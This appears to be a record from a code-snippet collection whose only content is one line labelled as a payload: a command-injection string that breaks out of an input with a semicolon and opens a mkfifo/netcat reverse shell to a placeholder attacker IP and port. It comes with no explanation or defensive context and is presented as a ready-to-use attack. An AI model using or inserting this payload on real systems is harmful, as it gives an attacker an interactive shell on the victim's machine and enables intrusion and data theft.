---
id: 215eac6a-8bbe-4c85-9758-cedeaa663c21
type: code
language: Payload
verified: false
created_at: '2020-02-21T06:27:23.549718+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 215eac6a

**Language**: Payload

```payload
AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```


